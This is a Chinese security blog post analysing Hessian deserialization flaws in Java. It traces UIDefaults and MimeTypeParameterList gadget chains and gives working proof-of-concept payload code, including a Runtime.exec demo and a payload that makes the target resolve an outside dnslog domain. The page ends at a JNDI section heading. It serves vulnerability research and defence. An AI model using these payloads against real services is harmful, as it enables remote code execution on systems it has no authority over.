<!DOCTYPE html>
<html lang="zn-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="简单分析了hessian反序列化的原因，构造多种payload来加载字节码、JNDI、命令执行、waf绕过等等">
<meta property="og:type" content="article">
<meta property="og:title" content="hessian反序列化">
<meta property="og:url" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Zad&#39;s blog">
<meta property="og:description" content="简单分析了hessian反序列化的原因，构造多种payload来加载字节码、JNDI、命令执行、waf绕过等等">
<meta property="og:locale" content="zn_CN">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904114641-enlnnn7.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115913-hc6q5mn.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115952-rwrghhs.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904140809-q14qkmg.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904141636-v09m2f3.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904153734-hagtqvk.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904154540-do0qbjh.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161543-z4x9xqd.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161657-qkx9brj.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162117-zgzq4vs.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162446-fy70s6o.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162510-ei1f4n9.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904163110-zhkjs8m.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152415-mtjjg1c.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152503-dr10gnt.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906151905-v5b8rzv.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170756-ax3oeow.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170805-d8gmuln.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906154411-eejfuuv.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904170813-kwgwvd1.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904171413-n9qzpzo.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212214-05oycdz.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212259-moufpru.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904213458-ib7l4pj.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142314-qhkqqj7.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142935-zfbnfpc.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901143010-sx4hrzn.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165100-3mo9phg.png">
<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165624-osqm0xw.png">
<meta property="article:published_time" content="2022-04-09T10:18:15.000Z">
<meta property="article:modified_time" content="2024-03-09T16:14:41.683Z">
<meta property="article:author" content="zad">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904114641-enlnnn7.png">

<link rel="canonical" href="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zn-CN'
  };
</script>

  <title>hessian反序列化 | Zad's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Zad's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hessian反序列化
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 18:18:15" itemprop="dateCreated datePublished" datetime="2022-04-09T18:18:15+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-10 00:14:41" itemprop="dateModified" datetime="2024-03-10T00:14:41+08:00">2024-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>很奇怪我mac下的环境执行命令会不稳定会崩溃，直接使用开发机中的idea吧</p>
<p>gadget2种路径入口：</p>
<p>Hessian2 hashCode&#x2F;equals&#x2F;compareTo</p>
<p>except构造obj触发toString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: x-application/hessian or application/x-hessian</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞原理1"><a href="#漏洞原理1" class="headerlink" title="漏洞原理1"></a>漏洞原理1</h3><p>调用栈如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hessian2Input#readObject</span><br><span class="line"> hashmap.put</span><br><span class="line">  hashmap.puval</span><br><span class="line">    hashmap.equqls   ---会对k进行get，此时的k为UIDefaults</span><br><span class="line">       UIDefaults.get</span><br><span class="line">	UIDefaults.getFromHashtable</span><br><span class="line">	 UIDefaults.createValue 任意类调用</span><br></pre></td></tr></table></figure>

<p>在hessian反序列化的Hessian2Input#readObject方法中，通过200多行的swich语句来进行不同的标识符来选择对应的数据类型进行处理<img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904114641-enlnnn7.png" alt="image"></p>
<p>其中先获取tag值为77即M然后匹配到对应的switch语句中调用this.findSerializerFactory().readMap(this, type)函数;</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115913-hc6q5mn.png" alt="image"></p>
<p>找到序列化工厂类</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115952-rwrghhs.png" alt="image"></p>
<p>跟进SerializerFactory.readMap()函数中，由于type为空且已经存在HashMap反序列化器，因此会调用MapDeserializer的readMap()函数继续解析序列化的Map内容</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904140809-q14qkmg.png" alt="image"></p>
<p>在MapDeserializer的readMap()函数首先循环遍历HessianInput的内容，将其中的键值都进行readObject()操作然后再put进该新建的HashMap实例中</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904141636-v09m2f3.png" alt="image"></p>
<p>在HashMap#put方法中会调用hash方法对传入的key进行hash计算，在调用putVal方法进行map处理</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904153734-hagtqvk.png" alt="image"></p>
<p>在putVal中会对key调用equals方法进行处理</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904154540-do0qbjh.png" alt="image"></p>
<p>在equqls方法中会对K、V进行遍历，第一次遍历获取到的是value是UIDefaults对象</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161543-z4x9xqd.png" alt="image"></p>
<p>在第二次遍历获取key为t.get(key)刚刚好是漏洞方法了UIDefaults.ProxyLazyValue</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161657-qkx9brj.png" alt="image"></p>
<p>此时就成功进入了UIDefaults#get方法</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162117-zgzq4vs.png" alt="image"></p>
<p>在跟入getFromHashtable方法，根据key获取到value，此时的value就是UIDefaults.ProxyLazyValue，value又是刚刚好实现了LazyValue接口那么就可以进入createValue方法</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162446-fy70s6o.png" alt="image"></p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162510-ei1f4n9.png" alt="image"></p>
<p>在createValue方法中，前面payload中通过反射acc为null ,第一个if语句刚刚好两者都为fales 结果为true ；另一个关键点是这里获取到的类加载器为当前线程类加载器，最后通过反射完成任意类调用</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904163110-zhkjs8m.png" alt="image"></p>
<h3 id="漏洞原理2-通过触发except到Tostring完成调用"><a href="#漏洞原理2-通过触发except到Tostring完成调用" class="headerlink" title="漏洞原理2-通过触发except到Tostring完成调用"></a>漏洞原理2-通过触发except到Tostring完成调用</h3><p>利用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hessian2Input#readObject     构造标识符为<span class="number">67</span></span><br><span class="line"> Hessian2Input#readObjectDefinition</span><br><span class="line">  Hessian2Input#readString</span><br><span class="line">   Hessian2Input#expect</span><br><span class="line">    StringBuilder#append</span><br><span class="line">     String#valueOf</span><br><span class="line">      MimeTypeParameterList#toString</span><br><span class="line">	 UIDefaults.get</span><br><span class="line">	  UIDefaults.getFromHashtable</span><br><span class="line">	   UIDefaults.createValue 任意类调用</span><br></pre></td></tr></table></figure>

<p>在反序列化过程中，标识符如果为67的时候会直接调用readObjectDefinition方法</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152415-mtjjg1c.png" alt="image"></p>
<p>在readObjectDefinition的readString方法就会调用expect方法</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152503-dr10gnt.png" alt="image"></p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906151905-v5b8rzv.png" alt="image"></p>
<p>直接拼接了obj导致可以调用任意类的ToString方法</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170756-ax3oeow.png" alt="image"></p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170805-d8gmuln.png" alt="image"></p>
<p>那么就可以toString到MimeTypeParameterList的toString方法，在其toString方法中parameters属性也是Hashtable类型，get就可以获取到SwingLazyValue类，在获取到Methodutils 然后任意类调用造成RCE</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906154411-eejfuuv.png" alt="image"></p>
<p>可以参考如下demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MimeTypeParameterList_toString</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dangerous</span> <span class="variable">dangerous</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dangerous</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] result;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(dangerous);</span><br><span class="line">        oo.flush();</span><br><span class="line">        result = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造数据包</span></span><br><span class="line">        <span class="type">byte</span>[] wraper = <span class="keyword">new</span> <span class="title class_">byte</span>[result.length+<span class="number">1</span>];</span><br><span class="line">        wraper[<span class="number">0</span>] = <span class="number">67</span>;</span><br><span class="line">        System.arraycopy(result, <span class="number">0</span>, wraper, <span class="number">1</span>, result.length);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(wraper));</span><br><span class="line">        hi.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dangerous</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dangerous</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Call exec.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>Hessian 4.x 3.x版本都可以触发dnslog</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_Demo_dnslog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ovjbvnb.dnsapi.cc&quot;</span>&#125;;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;getByName&quot;</span>, ags);</span><br><span class="line">        Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        <span class="comment">//hessian序列化</span></span><br><span class="line">        serObj(hashtable1, hashtable2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UIDefaults.get</span><br><span class="line">    UIDefaults.getFromHashTable</span><br><span class="line">        UIDefaults$LazyValue.createValue</span><br><span class="line">        UIDefaults#ProxyLazyValue.createValue</span><br><span class="line">            java.net.InetAddress</span><br></pre></td></tr></table></figure>

<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>Hessian 4.x 3.x版本都可以触发</p>
